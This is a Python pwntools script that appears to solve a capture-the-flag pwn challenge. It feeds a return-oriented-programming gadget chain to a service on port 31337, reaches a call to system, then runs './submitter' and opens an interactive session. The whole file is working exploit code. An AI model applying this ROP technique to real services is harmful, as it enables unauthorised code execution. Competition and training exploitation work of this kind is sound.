#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))


def write(value):
  r.recvuntil(b"Addr pls: ")
  r.sendline(str(value))


write(0x1)
write(0x1)
write(0x1)
# gdb.attach(r,"b *0x401A24")
# pause()
write(400000001)
syscall = 401311
pop_rax_pop_rdx_leave_ret = 487212
# system = 4050E0
# 437511: mov rax, rdx; leave; ret;
pop_rdi_pop_rbp = 402218
add_rax_rdi = 426880 #add eax, edi; vzeroupper; ret;
# bin_sh = 4A04F9
gadget1 = 413631 #mov rdi, rbx; call rax;
# 0x0000000000401014 call rax

leave_ret = 405350 #leave; mov rax, r10; ret;

gadget2 = 401796 # pop rbx; pop r12; pop rbp; ret;

gadget3 = 405156 # mov rdi, rax; cmp rdx, rcx; jae 0x5140; mov rax, rsi; ret
#rax is controled can call rax

#426893: inc rdi; add rax, rdi; vzeroupper; ret;
#
# 401914 mov    rdi, rax call system


# write(pop_rax_pop_rdx_leave_ret)
# 

# write(gadget2)
# write(490499)
# write(0)
# write(10060)
# write()
write(pop_rdi_pop_rbp)
write(490499)
write(10060)

write(add_rax_rdi)
write(pop_rdi_pop_rbp)
write(10060)
write(490499)
write(add_rax_rdi)
write(401914)


# write(bin_sh)
# write(bin_sh)
# write(system)
write(0)
sleep(0.5)
r.sendline("./submitter")

r.interactive()

